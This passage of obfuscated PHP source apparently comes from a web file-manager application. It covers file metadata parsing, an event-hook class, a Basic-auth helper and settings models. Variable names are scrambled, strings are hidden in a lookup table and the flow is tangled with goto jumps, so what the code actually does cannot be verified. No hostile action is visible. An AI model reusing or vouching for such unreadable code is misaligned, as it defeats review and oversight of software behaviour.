$DÑÄƒ¤ÖòÜ = _get($dÅÈ¿ºñÚ¹, $f±šÀ‡³); $DÑÄƒ¤ÖòÜ = is_array($DÑÄƒ¤ÖòÜ) ? $DÑÄƒ¤ÖòÜ[0] : $DÑÄƒ¤ÖòÜ; if ($DÑÄƒ¤ÖòÜ) { break; } } if ($DÑÄƒ¤ÖòÜ || $DÑÄƒ¤ÖòÜ === 0 || $DÑÄƒ¤ÖòÜ === !1) { $DÑÄƒ¤ÖòÜ = self::valueReset($B›ñçµÅË², $DÑÄƒ¤ÖòÜ, $càÙƒ÷…ƒ); if ($DÑÄƒ¤ÖòÜ !== null) { $bÂ°É‹àÁ¼[$càÙƒ÷…ƒ] = $DÑÄƒ¤ÖòÜ; } } } $bÂ°É‹àÁ¼ = self::valueResetAll($bÂ°É‹àÁ¼, $d“ùñÆï); return $bÂ°É‹àÁ¼; } private static function psdParse($Dœ½–ßÅ¸İ) { $eëÕÈ²¿­Œ =& $_SERVER[¯Ò¬Èè]; if (IO::fileSubstr($Dœ½–ßÅ¸İ, 0, 4) != $eëÕÈ²¿­Œ[1630]) { return !1; } $Dö‰Óùñ = getImageSize($Dœ½–ßÅ¸İ, $F¹ÌÆƒ£†’); if (!$Dö‰Óùñ) { return; } $D™Ÿòã›»Á = array($eëÕÈ²¿­Œ[1545] => $Dö‰Óùñ[0], $eëÕÈ²¿­Œ[1547] => $Dö‰Óùñ[1]); return $D™Ÿòã›»Á; } private static function pdfParse($Aá¯á°‹Ã²) { return FileParsePdf::parse($Aá¯á°‹Ã²); } private static function fileTypeParse() { $E˜á¹ˆ±ƒ =& $_SERVER[¯Ò¬Èè]; $f„ã®ğ‹°Ş = self::fileTypeArray(); $cÙ™‰…çäù = array(); foreach ($f„ã®ğ‹°Ş as $A¼ğ›ĞŸ’‰ => $CÈ¸‰øİŸ“) { $D§—¤°Şã = _get($CÈ¸‰øİŸ“, $E˜á¹ˆ±ƒ[160], $E˜á¹ˆ±ƒ[33]); $c½ÔóßÉôù = is_string($D§—¤°Şã) ? explode($E˜á¹ˆ±ƒ[47], $D§—¤°Şã) : $D§—¤°Şã; if (!$c½ÔóßÉôù) { continue; } foreach ($c½ÔóßÉôù as $D§—¤°Şã) { $D§—¤°Şã = strtolower(trim($D§—¤°Şã)); if (!$D§—¤°Şã) { continue; } $cÙ™‰…çäù[$D§—¤°Şã] = $A¼ğ›ĞŸ’‰; } $f„ã®ğ‹°Ş[$A¼ğ›ĞŸ’‰][$E˜á¹ˆ±ƒ[160]] = array_keys($cÙ™‰…çäù); $f„ã®ğ‹°Ş[$A¼ğ›ĞŸ’‰][$E˜á¹ˆ±ƒ[1628]] = self::parseKeyMap($CÈ¸‰øİŸ“[$E˜á¹ˆ±ƒ[1628]]); } return array($E˜á¹ˆ±ƒ[1627] => $f„ã®ğ‹°Ş, $E˜á¹ˆ±ƒ[1626] => $cÙ™‰…çäù); } private static function parseKeyMap($côˆß¢ø‰í) { $DÃ¯î‡³Äˆ =& $_SERVER[¯Ò¬Èè]; foreach ($côˆß¢ø‰í as $fòàğŠ¾›˜ => $d Ê”›İğ) { if (is_array($d Ê”›İğ)) { $CÒèÍ¡º‚ = self::parseKeyMap($d Ê”›İğ); if ($CÒèÍ¡º‚) { $côˆß¢ø‰í[$fòàğŠ¾›˜] = $CÒèÍ¡º‚; } continue; } $Eºİ÷‹Ã¤¸ = explode($DÃ¯î‡³Äˆ[47], $d Ê”›İğ); $d–é¶Éè½Š = array(); foreach ($Eºİ÷‹Ã¤¸ as $Bîœ¨¶”–ã) { $Bîœ¨¶”–ã = trim($Bîœ¨¶”–ã); if (!$Bîœ¨¶”–ã) { continue; } if (preg_match($DÃ¯î‡³Äˆ[1631], $Bîœ¨¶”–ã, $B¬¨¡éæ˜)) { $DŒ±Ûìåí = explode($DÃ¯î‡³Äˆ[271], $B¬¨¡éæ˜[1]); foreach ($DŒ±Ûìåí as $FÂäÉ×‚µ˜) { $d–é¶Éè½Š[] = str_replace($B¬¨¡éæ˜[0], $FÂäÉ×‚µ˜, $Bîœ¨¶”–ã); } } else { $d–é¶Éè½Š[] = $Bîœ¨¶”–ã; } } $côˆß¢ø‰í[$fòàğŠ¾›˜] = $d–é¶Éè½Š; } return $côˆß¢ø‰í; } private static function valueResetAll($FŒ‹‚·†¢Ú, $fóÀê³ëòÀ) { goto cçšâŞíô¼; bÂõ´»å§¸: if ($b ‹À·Ú) { $eÌ…ËœÙË = IO_PATH_SYSTEM_TEMP . $b“¦ßæğÎ£[1637] . KodIO::hashPath($fóÀê³ëòÀ) . $b“¦ßæğÎ£[1638]; $FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1639]] = Action($b“¦ßæğÎ£[1640])->pluginCacheFileSet($eÌ…ËœÙË, $b ‹À·Ú); unset($FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1641]][$b“¦ßæğÎ£[1624]]); } $eâ®ˆ÷‰šº = _get($FŒ‹‚·†¢Ú, $b“¦ßæğÎ£[1642], $b“¦ßæğÎ£[33]); $aî°‚šàĞ = _get($FŒ‹‚·†¢Ú, $b“¦ßæğÎ£[1643], $b“¦ßæğÎ£[33]); goto D¶ÑÄõÄ¦¤; D¶ÑÄõÄ¦¤: $dá°ØŸ—Œ = _get($FŒ‹‚·†¢Ú, $b“¦ßæğÎ£[1644], $b“¦ßæğÎ£[33]); $eÆÔ˜“ñÏÜ = $eâ®ˆ÷‰šº . $aî°‚šàĞ . $dá°ØŸ—Œ; if ($eÆÔ˜“ñÏÜ && get_charset($eÆÔ˜“ñÏÜ) != $b“¦ßæğÎ£[326]) { $FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1641]][$b“¦ßæğÎ£[1352]] = iconv_to($FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1641]][$b“¦ßæğÎ£[1352]], get_charset($eÆÔ˜“ñÏÜ), $b“¦ßæğÎ£[326]); $FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1641]][$b“¦ßæğÎ£[1645]] = iconv_to($FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1641]][$b“¦ßæğÎ£[1645]], get_charset($eÆÔ˜“ñÏÜ), $b“¦ßæğÎ£[326]); $FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1641]][$b“¦ßæğÎ£[1646]] = iconv_to($FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1641]][$b“¦ßæğÎ£[1646]], get_charset($eÆÔ˜“ñÏÜ), $b“¦ßæğÎ£[326]); } goto d‚Å£Ë ˆ; cçšâŞíô¼: $b“¦ßæğÎ£ =& $_SERVER[¯Ò¬Èè]; if (isset($FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1632]])) { $f´ÏùÀ¨Ì = ceil($FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1632]]); $Eì¤â„†‰Ì = intval($f´ÏùÀ¨Ì / 3600); $féÂõíä“ = intval(($f´ÏùÀ¨Ì - $Eì¤â„†‰Ì * 3600) / 60); $DãŸÆÛƒ¥À = $f´ÏùÀ¨Ì % 60; $FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1633]] = sprintf($b“¦ßæğÎ£[1634], $Eì¤â„†‰Ì, $féÂõíä“, $DãŸÆÛƒ¥À); if ($Eì¤â„†‰Ì == 0) { $FŒ‹‚·†¢Ú[$b“¦ßæğÎ£[1633]] = sprintf($b“¦ßæğÎ£[1635], $féÂõíä“, $DãŸÆÛƒ¥À); } } $b ‹À·Ú = _get($FŒ‹‚·†¢Ú, $b“¦ßæğÎ£[1636]); goto bÂõ´»å§¸; d‚Å£Ë ˆ: return $FŒ‹‚·†¢Ú; goto aÆÆ–ŒÙ‹ê; aÆÆ–ŒÙ‹ê: } private static function valueReset($dµËìĞÌ, $AÃ’Ó–©‡, $e ×¤ÇáÁĞ) { $EŒì‘¢¨¾ =& $_SERVER[¯Ò¬Èè]; $AöÉ¡ò„ŠŒ = $EŒì‘¢¨¾[1562]; switch ($dµËìĞÌ) { case $EŒì‘¢¨¾[1647]: $AÃ’Ó–©‡ = $AÃ’Ó–©‡ == $EŒì‘¢¨¾[83] ? $EŒì‘¢¨¾[1648] : $EŒì‘¢¨¾[1649]; break; case $EŒì‘¢¨¾[1650]: $AÃ’Ó–©‡ = $AÃ’Ó–©‡ ? $AÃ’Ó–©‡ : null; break; default: break; } switch ($e ×¤ÇáÁĞ) { case $EŒì‘¢¨¾[1651]: $AÃ’Ó–©‡ = round($AÃ’Ó–©‡, 2); break; case $EŒì‘¢¨¾[187]: case $EŒì‘¢¨¾[107]: if ($AÃ’Ó–©‡ < 0) { $AÃ’Ó–©‡ = null; } else { if (is_numeric($AÃ’Ó–©‡)) { $AÃ’Ó–©‡ = date($AöÉ¡ò„ŠŒ, $AÃ’Ó–©‡); } } break; default: break; } return $AÃ’Ó–©‡; } private static function fileTypeArray() { $c¬‰‰¾ñÜî =& $_SERVER[¯Ò¬Èè]; return array($c¬‰‰¾ñÜî[1624] => array($c¬‰‰¾ñÜî[160] => $c¬‰‰¾ñÜî[1652] . $c¬‰‰¾ñÜî[1653], $c¬‰‰¾ñÜî[1628] => array($c¬‰‰¾ñÜî[1545] => $c¬‰‰¾ñÜî[1654], $c¬‰‰¾ñÜî[1547] => $c¬‰‰¾ñÜî[1655], $c¬‰‰¾ñÜî[1656] => $c¬‰‰¾ñÜî[1657], $c¬‰‰¾ñÜî[1658] => $c¬‰‰¾ñÜî[1659], $c¬‰‰¾ñÜî[187] => $c¬‰‰¾ñÜî[1660], $c¬‰‰¾ñÜî[107] => $c¬‰‰¾ñÜî[1661], $c¬‰‰¾ñÜî[1662] => $c¬‰‰¾ñÜî[1663], $c¬‰‰¾ñÜî[1664] => $c¬‰‰¾ñÜî[1665], $c¬‰‰¾ñÜî[1666] => $c¬‰‰¾ñÜî[1667], $c¬‰‰¾ñÜî[1668] => $c¬‰‰¾ñÜî[1669], $c¬‰‰¾ñÜî[1670] => $c¬‰‰¾ñÜî[1671], $c¬‰‰¾ñÜî[1672] => $c¬‰‰¾ñÜî[1673], $c¬‰‰¾ñÜî[1674] => $c¬‰‰¾ñÜî[1675], $c¬‰‰¾ñÜî[1676] => array($c¬‰‰¾ñÜî[1677] => $c¬‰‰¾ñÜî[1678], $c¬‰‰¾ñÜî[1679] => $c¬‰‰¾ñÜî[1680], $c¬‰‰¾ñÜî[1681] => $c¬‰‰¾ñÜî[1682]), $c¬‰‰¾ñÜî[1683] => $c¬‰‰¾ñÜî[1684], $c¬‰‰¾ñÜî[1685] => $c¬‰‰¾ñÜî[1686], $c¬‰‰¾ñÜî[1687] => $c¬‰‰¾ñÜî[1688], $c¬‰‰¾ñÜî[1689] => $c¬‰‰¾ñÜî[1690], $c¬‰‰¾ñÜî[1691] => array($c¬‰‰¾ñÜî[1692] => $c¬‰‰¾ñÜî[1693], $c¬‰‰¾ñÜî[1694] => $c¬‰‰¾ñÜî[1695], $c¬‰‰¾ñÜî[1696] => $c¬‰‰¾ñÜî[1697], $c¬‰‰¾ñÜî[1698] => $c¬‰‰¾ñÜî[1699], $c¬‰‰¾ñÜî[1700] => $c¬‰‰¾ñÜî[1701], $c¬‰‰¾ñÜî[1702] => $c¬‰‰¾ñÜî[1703], $c¬‰‰¾ñÜî[1704] => $c¬‰‰¾ñÜî[1705], $c¬‰‰¾ñÜî[1706] => $c¬‰‰¾ñÜî[1707], $c¬‰‰¾ñÜî[1708] => $c¬‰‰¾ñÜî[1709], $c¬‰‰¾ñÜî[1710] => $c¬‰‰¾ñÜî[1711], $c¬‰‰¾ñÜî[1712] => $c¬‰‰¾ñÜî[1713]))), $c¬‰‰¾ñÜî[1714] => array($c¬‰‰¾ñÜî[160] => $c¬‰‰¾ñÜî[1715] . $c¬‰‰¾ñÜî[1716], $c¬‰‰¾ñÜî[1628] => array($c¬‰‰¾ñÜî[1632] => $c¬‰‰¾ñÜî[1717], $c¬‰‰¾ñÜî[187] => $c¬‰‰¾ñÜî[1718], $c¬‰‰¾ñÜî[107] => $c¬‰‰¾ñÜî[1719], $c¬‰‰¾ñÜî[1664] => $c¬‰‰¾ñÜî[1720], $c¬‰‰¾ñÜî[1721] => $c¬‰‰¾ñÜî[1722], $c¬‰‰¾ñÜî[1723] => $c¬‰‰¾ñÜî[1650], $c¬‰‰¾ñÜî[1724] => $c¬‰‰¾ñÜî[1725], $c¬‰‰¾ñÜî[1726] => $c¬‰‰¾ñÜî[1727], $c¬‰‰¾ñÜî[1728] => $c¬‰‰¾ñÜî[1729], $c¬‰‰¾ñÜî[1641] => array($c¬‰‰¾ñÜî[1352] => $c¬‰‰¾ñÜî[1730], $c¬‰‰¾ñÜî[1645] => $c¬‰‰¾ñÜî[1731], $c¬‰‰¾ñÜî[1646] => $c¬‰‰¾ñÜî[1732], $c¬‰‰¾ñÜî[1733] => $c¬‰‰¾ñÜî[1734], $c¬‰‰¾ñÜî[1735] => $c¬‰‰¾ñÜî[1736], $c¬‰‰¾ñÜî[1737] => $c¬‰‰¾ñÜî[1738], $c¬‰‰¾ñÜî[1624] => $c¬‰‰¾ñÜî[1739]))), $c¬‰‰¾ñÜî[1740] => array($c¬‰‰¾ñÜî[160] => $c¬‰‰¾ñÜî[1741] . $c¬‰‰¾ñÜî[1742], $c¬‰‰¾ñÜî[1628] => array($c¬‰‰¾ñÜî[1545] => $c¬‰‰¾ñÜî[1743], $c¬‰‰¾ñÜî[1547] => $c¬‰‰¾ñÜî[1744], $c¬‰‰¾ñÜî[1632] => $c¬‰‰¾ñÜî[1717], $c¬‰‰¾ñÜî[187] => $c¬‰‰¾ñÜî[1745], $c¬‰‰¾ñÜî[107] => $c¬‰‰¾ñÜî[1746], $c¬‰‰¾ñÜî[1651] => $c¬‰‰¾ñÜî[1747], $c¬‰‰¾ñÜî[1728] => $c¬‰‰¾ñÜî[1748], $c¬‰‰¾ñÜî[1724] => $c¬‰‰¾ñÜî[1749], $c¬‰‰¾ñÜî[1664] => $c¬‰‰¾ñÜî[1750], $c¬‰‰¾ñÜî[1714] => array($c¬‰‰¾ñÜî[1723] => $c¬‰‰¾ñÜî[1650], $c¬‰‰¾ñÜî[1751] => $c¬‰‰¾ñÜî[1752], $c¬‰‰¾ñÜî[1721] => $c¬‰‰¾ñÜî[1722], $c¬‰‰¾ñÜî[1728] => $c¬‰‰¾ñÜî[1729], $c¬‰‰¾ñÜî[1724] => $c¬‰‰¾ñÜî[1753], $c¬‰‰¾ñÜî[1726] => $c¬‰‰¾ñÜî[1727]))), $c¬‰‰¾ñÜî[1754] => array($c¬‰‰¾ñÜî[1628] => array($c¬‰‰¾ñÜî[1755] => $c¬‰‰¾ñÜî[1756], $c¬‰‰¾ñÜî[1757] => $c¬‰‰¾ñÜî[1758])), $c¬‰‰¾ñÜî[1759] => array($c¬‰‰¾ñÜî[1628] => array())); } } class Hook { private static $events = array(); public static function get($D¦ÊÍŒŠ§ø = false) { if (!$D¦ÊÍŒŠ§ø) { return self::$events; } else { return self::$events[$D¦ÊÍŒŠ§ø]; } } public static function apply($D°†òÓ±Ëª, $eÍÓ¦°°èÛ = array()) { $dê„ïùÅ‡ = ActionApply($D°†òÓ±Ëª, $eÍÓ¦°°èÛ); if (is_string($D°†òÓ±Ëª)) { Hook::trigger($D°†òÓ±Ëª); } return $dê„ïùÅ‡; } public static function bind($EÂÇá†¡¥, $bó£©¢÷Ê, $Bì·¥­åÔœ = false) { $d«ºî°‡³Ò =& $_SERVER[¯Ò¬Èè]; if (!isset(self::$events[$EÂÇá†¡¥])) { self::$events[$EÂÇá†¡¥] = array(); } self::$events[$EÂÇá†¡¥][] = array($d«ºî°‡³Ò[1760] => $bó£©¢÷Ê, $d«ºî°‡³Ò[1761] => $Bì·¥­åÔœ, $d«ºî°‡³Ò[1762] => 0); } public static function once($Eâœ¢¿Áô§, $a¨ÛãÑà‹­) { self::bind($Eâœ¢¿Áô§, $a¨ÛãÑà‹­, !0); } public static function unbind($cÄŞšªÙ©, $b °ñâ¿Ù = false) { if (!$b °ñâ¿Ù) { self::$events[$cÄŞšªÙ©] = array(); return; } $dšâ¥÷ëÀ÷ = self::$events[$cÄŞšªÙ©]; self::$events[$cÄŞšªÙ©] = array(); if (!is_array($dšâ¥÷ëÀ÷)) { return; } for ($cÉÂ¢ˆÎ¥… = 0; $cÉÂ¢ˆÎ¥… < count($dšâ¥÷ëÀ÷); $cÉÂ¢ˆÎ¥…++) { if ($dšâ¥÷ëÀ÷[$cÉÂ¢ˆÎ¥…][$_SERVER[¯Ò¬Èè][1760]] == $b °ñâ¿Ù) { continue; } self::$events[$cÄŞšªÙ©][] = $dšâ¥÷ëÀ÷[$cÉÂ¢ˆÎ¥…]; } } public static function filter($E›–¶ÚîÛ™, $a¸ˆÂ‹¸½ñ) { goto D×‰µëøø×; AØö½ãíÆ“: for ($C¿“»£ÔÖ = 0; $C¿“»£ÔÖ < count($féĞèï‘é); $C¿“»£ÔÖ++) { $e¿Í”µò = $féĞèï‘é[$C¿“»£ÔÖ]; if ($e¿Í”µò[$Aêˆ•ÒŒÙ[1761]] && $e¿Í”µò[$Aêˆ•ÒŒÙ[1762]] > 1) { continue; } self::$events[$E›–¶ÚîÛ™][$C¿“»£ÔÖ][$Aêˆ•ÒŒÙ[1762]] = $e¿Í”µò[$Aêˆ•ÒŒÙ[1762]] + 1; $B»æÔ—¾ÉÄ = self::apply($e¿Í”µò[$Aêˆ•ÒŒÙ[1760]], array($dìÛ±¬‚ß)); if (gettype($B»æÔ—¾ÉÄ) == gettype($dìÛ±¬‚ß)) { $dìÛ±¬‚ß = $B»æÔ—¾ÉÄ; } } return $dìÛ±¬‚ß; goto E”ë·ËñÁï; D×‰µëøø×: $Aêˆ•ÒŒÙ =& $_SERVER[¯Ò¬Èè]; $f‚á°Ä¤åÑ = self::$events; if (!isset($f‚á°Ä¤åÑ[$E›–¶ÚîÛ™])) { return $a¸ˆÂ‹¸½ñ; } goto cäæÎíÏ; cäæÎíÏ: $féĞèï‘é = $f‚á°Ä¤åÑ[$E›–¶ÚîÛ™]; $dìÛ±¬‚ß = $a¸ˆÂ‹¸½ñ; if (!is_array($féĞèï‘é) || count($féĞèï‘é) == 0) { return $dìÛ±¬‚ß; } goto AØö½ãíÆ“; E”ë·ËñÁï: } public static function trigger($D¶ÌŒŸäƒ¶) { goto Fêøà»ó³; bÚ¶Å‹‹: if (!isset($c¤îĞø–”ø[$D¶ÌŒŸäƒ¶])) { return $B»ìâ†Ã—; } $Cì©ÈÎøª£ = $c¤îĞø–”ø[$D¶ÌŒŸäƒ¶]; if (!is_array($Cì©ÈÎøª£) || count($Cì©ÈÎøª£) == 0) { return $B»ìâ†Ã—; } goto DÂ½Ãá‡ôö; fÇÆÌò‰: return $B»ìâ†Ã—; goto D¾îø…Û™›; DÂ½Ãá‡ôö: $AÉÛ’¢³…‰ = func_get_args(); array_shift($AÉÛ’¢³…‰); for ($f¯Êò‚â¥ = 0; $f¯Êò‚â¥ < count($Cì©ÈÎøª£); $f¯Êò‚â¥++) { $Aº³â§°‘ = $Cì©ÈÎøª£[$f¯Êò‚â¥]; if ($Aº³â§°‘[$A¯¬è«©Ç‚[1761]] && $Aº³â§°‘[$A¯¬è«©Ç‚[1762]] > 1) { continue; } if (defined($A¯¬è«©Ç‚[1763]) && GLOBAL_LOG_HOOK) { write_log($D¶ÌŒŸäƒ¶ . $A¯¬è«©Ç‚[1764] . $Aº³â§°‘[$A¯¬è«©Ç‚[1760]], $A¯¬è«©Ç‚[1765]); } self::$events[$D¶ÌŒŸäƒ¶][$f¯Êò‚â¥][$A¯¬è«©Ç‚[1762]] = $Aº³â§°‘[$A¯¬è«©Ç‚[1762]] + 1; $Ağ‰Œ¹î‘ = self::apply($Aº³â§°‘[$A¯¬è«©Ç‚[1760]], $AÉÛ’¢³…‰); if (defined($A¯¬è«©Ç‚[1763]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $A¯¬è«©Ç‚[1765]); if ($Aº³â§°‘[$A¯¬è«©Ç‚[1762]] == 200) { $c•ÜÖÁŒÒ§ = is_array($Aº³â§°‘[$A¯¬è«©Ç‚[1760]]) ? json_encode_force($Aº³â§°‘[$A¯¬è«©Ç‚[1760]]) : $Aº³â§°‘[$A¯¬è«©Ç‚[1760]]; write_log($A¯¬è«©Ç‚[1766] . $D¶ÌŒŸäƒ¶ . $A¯¬è«©Ç‚[1767] . $c•ÜÖÁŒÒ§, $A¯¬è«©Ç‚[1768]); } } $B»ìâ†Ã— = is_null($Ağ‰Œ¹î‘) ? $B»ìâ†Ã— : $Ağ‰Œ¹î‘; } goto fÇÆÌò‰; Fêøà»ó³: $A¯¬è«©Ç‚ =& $_SERVER[¯Ò¬Èè]; $c¤îĞø–”ø = self::$events; $B»ìâ†Ã— = !1; goto bÚ¶Å‹‹; D¾îø…Û™›: } } class HttpAuth { public static function get() { $DÁêÎ´ÈªŸ =& $_SERVER[¯Ò¬Èè]; $bÛ–·ğÀƒ = $DÁêÎ´ÈªŸ[33]; $EÒÚÆî§© = $DÁêÎ´ÈªŸ[33]; if (isset($_SERVER[$DÁêÎ´ÈªŸ[1769]])) { $bÛ–·ğÀƒ = $_SERVER[$DÁêÎ´ÈªŸ[1769]]; $EÒÚÆî§© = $_SERVER[$DÁêÎ´ÈªŸ[1770]]; } elseif (isset($_SERVER[$DÁêÎ´ÈªŸ[1771]])) { $f¶ÄÇŒ¼¶™ = $_SERVER[$DÁêÎ´ÈªŸ[1771]]; if (strpos(strtolower($f¶ÄÇŒ¼¶™), $DÁêÎ´ÈªŸ[1772]) === 0) { $fÊ‡ÙÄ‘–÷ = explode($DÁêÎ´ÈªŸ[4], base64_decode(substr($f¶ÄÇŒ¼¶™, 6))); $bÛ–·ğÀƒ = isset($fÊ‡ÙÄ‘–÷[0]) ? $fÊ‡ÙÄ‘–÷[0] : $DÁêÎ´ÈªŸ[33]; $EÒÚÆî§© = isset($fÊ‡ÙÄ‘–÷[1]) ? $fÊ‡ÙÄ‘–÷[1] : 0; } } return array($DÁêÎ´ÈªŸ[544] => $bÛ–·ğÀƒ, $DÁêÎ´ÈªŸ[906] => $EÒÚÆî§©); } public static function error() { goto Fö¨§¨–â§; Fö¨§¨–â§: $B¹‰…„ÜÊÁ =& $_SERVER[¯Ò¬Èè]; header($B¹‰…„ÜÊÁ[1773]); header($B¹‰…„ÜÊÁ[1774]); goto f¯‘ìÑøò; E¯ˆÌá‹«: die; goto f»ëË¦±ô; f¯‘ìÑøò: header($B¹‰…„ÜÊÁ[1775]); header($B¹‰…„ÜÊÁ[1776]); header($B¹‰…„ÜÊÁ[1271]); goto E¯ˆÌá‹«; f»ëË¦±ô: } public static function make($aÅ öÍ©¸, $b¨œÎìéÃ¼) { $fÑ•”½œÉ¸ =& $_SERVER[¯Ò¬Èè]; return $fÑ•”½œÉ¸[1777] + base64_encode($aÅ öÍ©¸ . $fÑ•”½œÉ¸[4] . $b¨œÎìéÃ¼); } } goto fÉï›™–ß¤; E›š¢±åƒ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\x6e\157\164\x69\x63\145\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\143\157\x6e\164\145\x6e\164", "\x61\165\x74\x68", "\x6d\157\x64\145", "\164\x69\155\145", "\164\x79\160\x65", "\154\x65\166\145\154", "\145\x6e\x61\x62\x6c\x65", "\x73\157\162\x74"); public function listData($b®è‡àŞ·ß = false, $F§ÅøçÛëÄ = "\x73\x6f\x72\164", $bŸ ÉÓ´œ = false) { return parent::listData($b®è‡àŞ·ß, $F§ÅøçÛëÄ, $bŸ ÉÓ´œ); } public function add($DÚçøŠ¥çŠ) { $DÔôÊƒ«¬Ã =& $_SERVER[¯Ò¬Èè]; $F°­É–„½– = time(); if ($DÚçøŠ¥çŠ[$DÔôÊƒ«¬Ã[12]] == $DÔôÊƒ«¬Ã[2483]) { $F°­É–„½– = strtotime($DÚçøŠ¥çŠ[$DÔôÊƒ«¬Ã[190]]); } $DÚçøŠ¥çŠ[$DÔôÊƒ«¬Ã[190]] = $F°­É–„½–; return parent::insert($DÚçøŠ¥çŠ); } public function update($FËÓ…‘ÎŠ, $eã³¬×Ç›) { goto D”¼åœ…Ùø; B«ù´«ÊĞ”: $a³íÈÓ×ä‰ = time(); if ($eã³¬×Ç›[$dÓ³æÚ‹¦†[12]] == $dÓ³æÚ‹¦†[2483]) { $a³íÈÓ×ä‰ = strtotime($eã³¬×Ç›[$dÓ³æÚ‹¦†[190]]); } $eã³¬×Ç›[$dÓ³æÚ‹¦†[190]] = $a³íÈÓ×ä‰; goto f‹­§ÖÒ¡É; f‹­§ÖÒ¡É: return parent::update($FËÓ…‘ÎŠ, $eã³¬×Ç›); goto aö„™œœ®ã; D”¼åœ…Ùø: $dÓ³æÚ‹¦† =& $_SERVER[¯Ò¬Èè]; $Fá„Ğš‰ÕÙ = $this->listData($FËÓ…‘ÎŠ); if (!$Fá„Ğš‰ÕÙ) { return !1; } goto B«ù´«ÊĞ”; aö„™œœ®ã: } public function remove($EÌÑÙ¸½ö) { $CğÜÑµöçÜ = $this->listData($EÌÑÙ¸½ö); if (!$CğÜÑµöçÜ || $CğÜÑµöçÜ[$_SERVER[¯Ò¬Èè][1089]]) { return !1; } return parent::remove($EÌÑÙ¸½ö); } public function sort($eÑ˜å¶‘Š¨, $c»“çÈÜ¶) { return parent::update($eÑ˜å¶‘Š¨, $c»“çÈÜ¶); } public function enable($fô×É…µÍÆ, $c´¬Œ™Ãê†) { return parent::update($fô×É…µÍÆ, array($_SERVER[¯Ò¬Èè][2484] => $c´¬Œ™Ãê†)); } private function initUserOption() { $FïËŸã´ç =& $_SERVER[¯Ò¬Èè]; $this->optionType = $FïËŸã´ç[2485]; $this->modelType = $FïËŸã´ç[2486]; $this->field = array($FïËŸã´ç[2487], $FïËŸã´ç[28], $FïËŸã´ç[190], $FïËŸã´ç[29], $FïËŸã´ç[2488], $FïËŸã´ç[703], $FïËŸã´ç[183]); } public function userNoticeGet($eêê¼¿³Ş” = false) { $this->initUserOption(); return parent::listData($eêê¼¿³Ş”, $_SERVER[¯Ò¬Èè][367], !0); } public function userNoticeAdd($cÁˆŒŸˆù) { $bÔ†‰ÕËŒ× =& $_SERVER[¯Ò¬Èè]; $this->initUserOption(); $bÕ¤à´†® = $this->findByKey($bÔ†‰ÕËŒ×[2487], $cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[367]]); if ($bÕ¤à´†®) { return !0; } $AÙ²ä¸ ”Ï = array($bÔ†‰ÕËŒ×[2487] => $cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[367]], $bÔ†‰ÕËŒ×[28] => $cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[28]], $bÔ†‰ÕËŒ×[190] => $cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[190]], $bÔ†‰ÕËŒ×[29] => isset($cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[29]]) ? $cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[29]] : 1, $bÔ†‰ÕËŒ×[2488] => isset($cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[2488]]) ? $cÁˆŒŸˆù[$bÔ†‰ÕËŒ×[2488]] : 0, $bÔ†‰ÕËŒ×[703] => 0, $bÔ†‰ÕËŒ×[183] => 0); return parent::insert($AÙ²ä¸ ”Ï); } public function userNoticeEdit($a—Ïã…Şƒ, $Aİ½ìµùÚ‰) { $this->initUserOption(); return parent::update($a—Ïã…Şƒ, $Aİ½ìµùÚ‰); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\145\x6d\x5f\157\160\164\x69\157\x6e"; protected $jsonField = array("\155\x65\x6e\x75", "\x72\157\x6c\145", "\162\x6f\154\145\107\x72\157\x75\x70", "\162\145\147\151\163\x74", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($e³‘İ‘ñº¤) { return "\123\x79\x73\164\145\155\117\x70\164\151\x6f\156\x5f{$e³‘İ‘ñº¤}"; } protected function optionDefault($aéëÍå‡¿ = '') { $B†á…âµ =& $_SERVER[¯Ò¬Èè]; if ($aéëÍå‡¿ == $B†á…âµ[33]) { return $GLOBALS[$B†á…âµ[6]][$B†á…âµ[2489]]; } } } class SystemRecordModel extends ModelBaseLight { } goto d‘µƒ‡éó÷; c©ôïö˜‹: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\x2e\x74\x61\147\114\151\163\164"; public $modelType = "\125\163\145\x72\x4f\x70\164\x69\157\x6e"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\x79\154\x65", "\163\x6f\x72\164"); public function listData($bÇ•»¹½š… = false, $eŠÂ£‰´Ø = "\x73\157\x72\164", $Dë—´åÓáæ = false) { return parent::listData($bÇ•»¹½š…, $eŠÂ£‰´Ø, $Dë—´åÓáæ); } public function remove($DæË‘´©Ù¾) { return parent::remove($DæË‘´©Ù¾); } public function add($EÇŸÀØñï¨, $CÉ¹£‰—‚¢ = "\154\x61\142\x65\x6c\x2d\147\x72\145\x79\x2d\156\x6f\x72\x6d\141\x6c") { $Dè‘¹ÔË… =& $_SERVER[¯Ò¬Èè]; if ($this->findByName($EÇŸÀØñï¨)) { return !1; } $eë¸Æ×Œ»¥ = array($Dè‘¹ÔË…[386] => $EÇŸÀØñï¨, $Dè‘¹ÔË…[437] => $CÉ¹£‰—‚¢, $Dè‘¹ÔË…[2118] => $this->getSort($Dè‘¹ÔË…[246]) + 1); return parent::insert($eë¸Æ×Œ»¥); } public function update($cõ¿Ú‡¼·ƒ, $f••¿ôÚ) { $aµŠ†­­ôã =& $_SERVER[¯Ò¬Èè]; 